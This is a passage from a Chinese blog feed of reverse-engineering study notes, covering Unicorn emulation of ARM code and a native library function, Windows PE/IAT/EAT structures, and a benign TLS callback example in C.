function_">hook_memory</span>(<span class="params">uc, access, address, size,value, userdata</span>):</span><br><span class="line">    pc = uc.reg_read(UC_ARM_REG_PC)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;memory error: pc:%x address:%x size:%x&quot;</span> % (pc, address, size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_arm</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate ARM code&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in ARM mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)<span class="comment"># 创建代码</span></span><br><span class="line">        <span class="comment"># 其它代码添加到此处</span></span><br><span class="line">        <span class="keyword">return</span> mu</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line">mu = test_arm() <span class="comment"># mu就是arm虚拟机</span></span><br><span class="line">image = <span class="built_in">open</span>(<span class="string">&#x27;./libnative-lib.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 镜像内存</span></span><br><span class="line">image_base = <span class="number">0x0</span></span><br><span class="line">mu.mem_map(image_base, <span class="number">0x10000</span>*<span class="number">8</span>)  <span class="comment"># 这里大小自己估算</span></span><br><span class="line">mu.mem_write(image_base,image)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈内存</span></span><br><span class="line">stack_base = <span class="number">0xa0000</span></span><br><span class="line">stack_size = <span class="number">0x10000</span> * <span class="number">3</span></span><br><span class="line">mu.mem_map(stack_base, stack_size)  <span class="comment"># 这里大小自己估算</span></span><br><span class="line">stack_top = stack_base + stack_size - <span class="number">0x4</span></span><br><span class="line">mu.reg_write(UC_ARM_REG_SP,stack_top)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据段内存</span></span><br><span class="line">a1 = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line">data_base = <span class="number">0xf0000</span></span><br><span class="line">data_size = <span class="number">0x10000</span> * <span class="number">3</span></span><br><span class="line">mu.mem_map(data_base, data_size)  <span class="comment"># 这里大小自己估算</span></span><br><span class="line">mu.mem_write(data_base,a1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#函数参数通过数据段传递 寄存器是R0</span></span><br><span class="line">mu.reg_write(UC_ARM_REG_R0,data_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加hook函数</span></span><br><span class="line"><span class="comment"># mu.hook_add(UC_HOOK_CODE,hook_code,0)</span></span><br><span class="line"><span class="comment"># mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开始执行虚拟机</span></span><br><span class="line">start_addr = <span class="number">0x9B68</span></span><br><span class="line">end_addr = <span class="number">0x9C2C</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 添加got表</span></span><br><span class="line">    mu.mem_write(<span class="number">0x1EDB0</span>,<span class="string">b&#x27;\xD9\x98\x00\x00&#x27;</span>)</span><br><span class="line">    mu.emu_start(start_addr+<span class="number">1</span>, end_addr)</span><br><span class="line">    R2 = mu.reg_read(UC_ARM_REG_R2)</span><br><span class="line">    res = mu.mem_read(R2,<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(binascii.b2a_hex(res))</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn start&lt;/p&gt;
&lt;p&gt;用unicorn调用so文件中的某个函数，观察函数的输入与输出&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning1</title>
    <link href="https://pa1r0t.github.io/2022/12/29/unicorn1/"/>
    <id>https://pa1r0t.github.io/2022/12/29/unicorn1/</id>
    <published>2022-12-29T06:32:54.000Z</published>
    <updated>2022-12-29T07:54:07.945Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn start!</p><p>效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了</p><span id="more"></span><h1 id="Unicorn-入门学习"><a href="#Unicorn-入门学习" class="headerlink" title="Unicorn 入门学习"></a>Unicorn 入门学习</h1><p>unicorn 是用于执行多种cpu框架的虚拟架构系统</p><h5 id="下面进行模仿arm架构，执行arm指令"><a href="#下面进行模仿arm架构，执行arm指令" class="headerlink" title="下面进行模仿arm架构，执行arm指令"></a>下面进行模仿arm架构，执行arm指令</h5><p>首先在python中导入unicorn</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>如何根据自己要执行指令对应哪个cpu架构，来导入相应的处理器相关的常量</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn.arm_const  <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm64_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.m68k_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.mips_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.sparc_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>寄存器常量命名规则：<br>UC_ + 指令集 + <em>REG</em> + 大写寄存器名<br>UC_ARM<em>REG</em> + 大写寄存器名 （UC_ARM_REG_R0）<br>UC_X86<em>REG</em> + 大写寄存器名 （UC_X86_REG_EAX）</p><p>这里我们选择unicorn.arm_const</p><h4 id="创建arm虚拟机（UC）"><a href="#创建arm虚拟机（UC）" class="headerlink" title="创建arm虚拟机（UC）"></a>创建arm虚拟机（UC）</h4><p>Uc 是unicorn的主类，Uc对象则代表了一个独立的虚拟机实例，它有独立的寄存器和内存等资源，不同Uc对象之间的数据是独立的。Uc的构造函数有两个参数 <em>arch</em> 和 <em>mode</em>，用来指定模拟执行的指令集和对应的位数或模式。<br>arch常量参数一般以 UC<em>ARCH</em> 开头，MODE常量以UC<em>MODE</em> 开头。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Test ARM</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_arm</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate ARM code&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in ARM mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)<span class="comment"># 创建代码</span></span><br><span class="line">        <span class="comment"># 其它代码添加到此处</span></span><br><span class="line">        <span class="keyword">return</span> mu</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line">mu = test_arm() <span class="comment"># mu就是arm虚拟机</span></span><br></pre></td></tr></table></figure><h4 id="映射内存"><a href="#映射内存" class="headerlink" title="映射内存"></a>映射内存</h4><p>想用Unicorn模拟执行代码，是不能将代码字节流直接以参数形式传递给Unicorn，而是将要执行的代码写入到Unicorn 的虚拟内存中。Uc 虚拟机实例初始内存是没有任何映射的，在读写内存之前使用<em>uc_mem_map</em>函数映射一段内存</p><p>这里开始地址和地址大小都要和0x1000&#x3D;&#x3D;对齐&#x3D;&#x3D;</p><p>否则就是我这种错误：</p><p><img src="/./../images/image-20221229151625712.png" alt="image-20221229151625712"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADDRESS = <span class="number">0x10000</span></span><br><span class="line">mu.mem_map(ADDRESS, <span class="number">0x1000</span>)  <span class="comment"># 这里大小自己估算</span></span><br></pre></td></tr></table></figure><h4 id="写入代码"><a href="#写入代码" class="headerlink" title="写入代码"></a>写入代码</h4><p>将想要执行的代码写进我们创建的内存中</p><p>mem_write的第二个参数必须是byte字节数组，只支持python的byte数组，不能是String或者bytearray。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ARM_CODE   = <span class="string">b&quot;\x37\x00\xa0\xe3\x03\x10\x42\xe0&quot;</span></span><br><span class="line"><span class="comment"># mov r0, #0x37;</span></span><br><span class="line"><span class="comment"># sub r1, r2, r3</span></span><br><span class="line">mu.mem_write(ADDRESS, ARM_CODE) </span><br></pre></td></tr></table></figure><p>给寄存器初始赋值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_ARM_REG_R0, <span class="number">0x0</span>)</span><br><span class="line">mu.reg_write(UC_ARM_REG_R2, <span class="number">0x4</span>)</span><br><span class="line">mu.reg_write(UC_ARM_REG_R3, <span class="number">0x1</span>)</span><br><span class="line"><span class="comment"># 这里r1的结果预估是0x3</span></span><br></pre></td></tr></table></figure><h4 id="添加指令级的Hook"><a href="#添加指令级的Hook" class="headerlink" title="添加指令级的Hook"></a>添加指令级的Hook</h4><p>hook类型：</p><ul><li>指令执行类：<ul><li>UC_HOOK_INTR</li><li>UC_HOOK_INSN</li><li>UC_HOOK_CODE</li><li>UC_HOOK_BLOCK</li></ul></li><li>内存访问类：<ul><li>UC_HOOK_MEM_READ</li><li>UC_HOOK_MEM_WRITE</li><li>UC_HOOK_MEM_FETCH</li><li>UC_HOOK_MEM_READ_AFTER</li><li>UC_HOOK_MEM_PROT</li><li>UC_HOOK_MEM_FETCH_INVALID</li><li>UC_HOOK_MEM_INVALID</li><li>UC_HOOK_MEM_VALID</li></ul></li><li>异常处理类：<ul><li>UC_HOOK_MEM_READ_UNMAPPED</li><li>UC_HOOK_MEM_WRITE_UNMAPPED</li><li>UC_HOOK_MEM_FETCH_UNMAPPED</li></ul></li></ul><p><img src="/./../images/image-20221229153037712.png" alt="image-20221229153037712"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_add</span>(<span class="params">self, htype, callback, user_data=<span class="literal">None</span>, begin=<span class="number">1</span>, end=<span class="number">0</span>, arg1=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure><p>以上是添加hook的操作</p><p>在begin…end范围内的每一条指令被执行前都会调用callback。</p><p>hook函数编写：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># callback for tracing instructions</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br></pre></td></tr></table></figure><h4 id="执行虚拟机"><a href="#执行虚拟机" class="headerlink" title="执行虚拟机"></a>执行虚拟机</h4><p>emu_start 可以通过timeout参数设置最长执行时长，防止线程死在虚拟机里面。emu_start 执行完成后，可以通过读取内存或寄存器的方式来获取执行结果。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">emu_start</span>(<span class="params">self, begin, until, timeout=<span class="number">0</span>, count=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(ARM_CODE))</span><br></pre></td></tr></table></figure><p>执行成功，hook函数一共被调用两次（指令有两条）</p><p><img src="/./../images/image-20221229154734059.png" alt="image-20221229154734059"></p><h4 id="获取寄存器结果"><a href="#获取寄存器结果" class="headerlink" title="获取寄存器结果"></a>获取寄存器结果</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r0 = mu.reg_read(UC_ARM_REG_R0)</span><br><span class="line">r1 = mu.reg_read(UC_ARM_REG_R1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; R0 = 0x%x&quot;</span> % r0)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; R1 = 0x%x&quot;</span> % r1)</span><br></pre></td></tr></table></figure><p>和推理的结果相同！！！！</p><p><img src="/./../images/image-20221229154900787.png" alt="image-20221229154900787"></p><hr><h3 id="个人测试全过程："><a href="#个人测试全过程：" class="headerlink" title="个人测试全过程："></a>个人测试全过程：</h3><p><img src="/./../images/image-20221229155328503.png" alt="image-20221229155328503"></p><p><img src="/./../images/image-20221229155356531.png" alt="image-20221229155356531"></p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line">ARM_CODE   = <span class="string">b&quot;\x37\x00\xa0\xe3\x03\x10\x42\xe0&quot;</span></span><br><span class="line"><span class="comment"># mov r0, #0x37;</span></span><br><span class="line"><span class="comment"># sub r1, r2, r3</span></span><br><span class="line"><span class="comment"># Test ARM</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># callback for tracing instructions</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_arm</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate ARM code&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in ARM mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">        ADDRESS = <span class="number">0x10000</span></span><br><span class="line">        mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">0x10000</span>)</span><br><span class="line">        mu.mem_write(ADDRESS, ARM_CODE)</span><br><span class="line"> </span><br><span class="line">        mu.reg_write(UC_ARM_REG_R0, <span class="number">0x1234</span>)</span><br><span class="line">        mu.reg_write(UC_ARM_REG_R2, <span class="number">0x6789</span>)</span><br><span class="line">        mu.reg_write(UC_ARM_REG_R3, <span class="number">0x3333</span>)</span><br><span class="line"> </span><br><span class="line">        mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)</span><br><span class="line">        <span class="comment"># emulate machine code in infinite time</span></span><br><span class="line">        mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(ARM_CODE))</span><br><span class="line">        r0 = mu.reg_read(UC_ARM_REG_R0)</span><br><span class="line">        r1 = mu.reg_read(UC_ARM_REG_R1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; R0 = 0x%x&quot;</span> % r0)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; R1 = 0x%x&quot;</span> % r1)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></figure><blockquote><p>文章引用Pandaos大佬的文章：[<a href="https://bbs.pediy.com/thread-253868.htm#msg_header_h1_1">原创] Unicorn 在 Android 的应用-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn start!&lt;/p&gt;
&lt;p&gt;效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>re_base3</title>
    <link href="https://pa1r0t.github.io/2022/12/22/re-base3/"/>
    <id>https://pa1r0t.github.io/2022/12/22/re-base3/</id>
    <published>2022-12-22T11:33:01.000Z</published>
    <updated>2022-12-22T13:20:03.197Z</updated>
    
    <content type="html"><![CDATA[<p>PE and IAT hook</p><span id="more"></span><h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><p>由于了解IAT,需要了解一点PE,这里把PE也给写了吧</p><p>PE文件种类：</p><p><img src="/./../images/image-20221222193952005.png" alt="image-20221222193952005"></p><p>OBJ文件不能执行，dll和sys文件需要调试器执行或者服务和程序加载执行</p><p>DOS签名和PE签名</p><p><img src="/./../images/image-20221222194231640.png" alt="image-20221222194231640"></p><p>PE文件大体分为：1.PE头、2.PE体</p><p>1.PE头</p><ul><li>DOS签名</li><li>DOS存根</li><li>NT头</li><li>一系列节区头<ul><li>.data(数据)</li><li>.text(代码)</li><li>.rsrc(资源)</li></ul></li></ul><p>2.PE体：一系列节区</p><p>名词介绍：</p><p>​VA:virtual address 绝对虚拟内存地址</p><p>​RVA:相对虚拟内存地址</p><p>​VA &#x3D; RVA + imageBase</p><p>DOS头结构体：唯一有用的就是e_magic和e_lfanew</p><p><img src="/./../images/image-20221222195650362.png" alt="image-20221222195650362"></p><p>其中e_magic就是Dos签名，e_lfanew就是NT头的偏移</p><h5 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h5><p>Dos存根是兼容dos系统的一种产物，可有可无，内容可用xp内置debug查看</p><p><img src="/./../images/image-20221222195853656.png" alt="image-20221222195853656"></p><p>内容是一段汇编代码，在dos系统中执行</p><h5 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h5><p>NT头结构体</p><p><img src="/./../images/image-20221222200235227.png" alt="image-20221222200235227"></p><p>签名不作介绍，文件头结构体：</p><p><img src="/./../images/image-20221222200349032.png" alt="image-20221222200349032"></p><p>Machine代表cpu类别</p><p>SizeOfOptionalHeader是表示可选头的大小</p><p>Characteristics表示文件是否是dll，是否可执行</p><p>NT可选头结构体：</p><p><img src="/./../images/image-20221222200743347.png" alt="image-20221222200743347"></p><p><img src="/./../images/image-20221222200759909.png" alt="image-20221222200759909"></p><p>NT可选头非常重要，它记录了很多重要的数据</p><p>ImageBase，是映像基址，映像指的是PE文件加载到内存的一种形态（我觉得更像是一种叫法），映像基址定义了文件加载进内存的基础地址</p><p>SectionAlignment, 节区对齐是文件在内存中的最小单位，文件在内存的大小应该是这个值的整数倍</p><p>FileAlignment, 文件对齐是文件在磁盘中的最小单位，文件在磁盘的大小应该是这个值的整数倍</p><p>Subsystem,子系统用来区分文件是sys驱动文件还是exe可执行文件</p><p><img src="/./../images/image-20221222201551009.png" alt="image-20221222201551009"></p><p>NumberOfRvaAndSizes , 记录DataDirectory数组的个数</p><p>DataDirectory：</p><p><img src="/./../images/image-20221222201756663.png" alt="image-20221222201756663"></p><p>节区头结构体：</p><p><img src="/./../images/image-20221222202014726.png" alt="image-20221222202014726"></p><p><img src="/./../images/image-20221222202552956.png" alt="image-20221222202552956"></p><p>这里的VirtualAddress是用RVA表示的</p><h5 id="RAV-to-RAW"><a href="#RAV-to-RAW" class="headerlink" title="RAV to RAW"></a>RAV to RAW</h5><p>RAW就是文件中节区的偏移（非内存）</p><p><img src="/./../images/image-20221222203627898.png" alt="image-20221222203627898"></p><h5 id="IAT导入地址表"><a href="#IAT导入地址表" class="headerlink" title="IAT导入地址表"></a>IAT导入地址表</h5><p>映像导入描述结构体：</p><p><img src="/./../images/image-20221222204623280.png" alt="image-20221222204623280"></p><p><img src="/./../images/image-20221222204719793.png" alt="image-20221222204719793"></p><p>文件导入多少个库文件，就有多少个 image_import_descriptor结构体</p><p>&#x3D;&#x3D;该结构体的地址保存在image_optional_header32.DataDirectory[1].VirtualAddress中&#x3D;&#x3D;</p><p><img src="/./../images/image-20221222210418625.png" alt="image-20221222210418625"></p><p>INT结构体保存着Image_import_by_name的指针</p><p>结构图：</p><p><img src="/./../images/image-20221222205449044.png" alt="image-20221222205449044"></p><p>PE装载器将导入函数加载到IAT的顺序：</p><p><img src="/./../images/image-20221222205721041.png" alt="image-20221222205721041"></p><h1 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h1><p>不想写了，和IAT差不多，一个导入一个导出</p><p>它的查找数据先是image_optional_header32.DataDirectory[0].VirtualAddress找到这个结构体，然后根据要找的函数名去AddressOfNames数组里面拿到下标，然后用下标再去Oridinal数组找，找到下标又去AddressOfFunction那里找函数地址</p><p>没有函数名直接用Ordinal查找，Ordinal数组存在的意义是我忘了。。反正就这样</p><p><img src="/./../images/image-20221222211536947.png" alt="image-20221222211536947"></p><p><img src="/./../images/image-20221222211514061.png" alt="image-20221222211514061"></p><hr><h1 id="IAT-hook"><a href="#IAT-hook" class="headerlink" title="IAT hook"></a>IAT hook</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;PE and IAT hook&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>re_base2</title>
    <link href="https://pa1r0t.github.io/2022/12/21/re-base2/"/>
    <id>https://pa1r0t.github.io/2022/12/21/re-base2/</id>
    <published>2022-12-21T13:56:29.000Z</published>
    <updated>2022-12-22T03:22:59.840Z</updated>
    
    <content type="html"><![CDATA[<p>TLS and keyboard hooking</p><span id="more"></span><h1 id="TLS回调"><a href="#TLS回调" class="headerlink" title="TLS回调"></a>TLS回调</h1><p>TLS(Thread Local Storage) 线程本地存储，主要用于提供本地线程访问局部数据的句柄。</p><p>下面来一段官方解释：</p><p>使用线程<em>本地存储</em> （TLS），可以为进程可以使用全局索引访问的每个线程提供唯一数据。一个线程分配索引，其他线程可以使用它来检索与索引关联的唯一数据</p><p>原理图：</p><p><img src="/./../images/image-20221221220303818.png" alt="image-20221221220303818"></p><p>&#x3D;&#x3D;TLS主要用于程序的反调试检测&#x3D;&#x3D;</p><p>它在运行EP（entrypoint 程序入口代码）代码前执行</p><h6 id="TLS结构体："><a href="#TLS结构体：" class="headerlink" title="TLS结构体："></a>TLS结构体：</h6><p><img src="/./../images/image-20221221220612843.png" alt="image-20221221220612843"></p><p>可以看到TLS结构体中保存着回调函数的地址</p><p>可以打开CFF explore软件直接查看存放TLS回调函数数组的地址</p><p><img src="/./../images/image-20221221221105861.png" alt="image-20221221221105861"></p><p>打开od查看它的地址为401000</p><p><img src="/./../images/image-20221221221841170.png" alt="image-20221221221841170"></p><p>汇编直接定位过去就出来了</p><p><img src="/./../images/image-20221221221931378.png" alt="image-20221221221931378"></p><p>TLS回调函数是在进程或线程创建或终止时调用，如果某个进程存在一个线程，那从程序的创建到销毁需要4次调用回调函数</p><p>TLS回调函数定义：</p><p><img src="/./../images/image-20221221222309417.png" alt="image-20221221222309417"></p><p>注册TLS程序示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_console</span><span class="params">(<span class="type">char</span>* szMsg)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line"></span><br><span class="line">    WriteConsoleA(hStdout, szMsg, <span class="built_in">strlen</span>(szMsg), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI <span class="title function_">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> szMsg[<span class="number">80</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    wsprintfA(szMsg, <span class="string">&quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\n&quot;</span>, DllHandle, Reason);</span><br><span class="line">    print_console(szMsg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI <span class="title function_">TLS_CALLBACK2</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> szMsg[<span class="number">80</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    wsprintfA(szMsg, <span class="string">&quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\n&quot;</span>, DllHandle, Reason);</span><br><span class="line">    print_console(szMsg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_console(<span class="string">&quot;ThreadProc() start\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    print_console(<span class="string">&quot;ThreadProc() end\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    print_console(<span class="string">&quot;main() start\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    